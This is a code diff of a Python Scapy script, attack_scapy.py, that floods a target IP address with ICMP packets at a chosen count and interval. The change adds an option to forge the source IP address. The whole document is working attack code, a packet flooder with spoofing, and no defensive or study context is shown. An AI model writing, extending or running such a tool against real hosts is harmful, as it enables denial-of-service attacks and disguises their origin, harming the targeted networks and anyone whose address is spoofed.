@@ -4,24 +4,28 @@ import time
 
 def main():
     if len(sys.argv) < 4:
-        print("Usage: python3 attack_scapy.py <target_ip> <count> <interval>")
-        print("Example: python3 attack_scapy.py 10.0.0.2 50 0.05")
+        print("Usage:")
+        print("python3 attack_scapy.py <target_ip> <count> <interval> [spoof_ip]")
         sys.exit(1)
 
     target_ip = sys.argv[1]
     count = int(sys.argv[2])
     interval = float(sys.argv[3])
 
-    print(f"Starting ICMP flood to {target_ip} with {count} packets every {interval} sec")
+    spoof_ip = sys.argv[4] if len(sys.argv) >= 5 else None
 
-    pkt = IP(dst=target_ip) / ICMP()
+    print("Starting Scapy ICMP flood...")
 
-    for i in range(count):
+    for _ in range(count):
+        if spoof_ip:
+            pkt = IP(src=spoof_ip, dst=target_ip) / ICMP()
+        else:
+            pkt = IP(dst=target_ip) / ICMP()
+
         send(pkt, verbose=False)
-        print(f"Sent packet {i+1}/{count}")
         time.sleep(interval)
 
-    print("Attack finished.")
+    print("Attack completed.")
 
 if __name__ == "__main__":
     main()
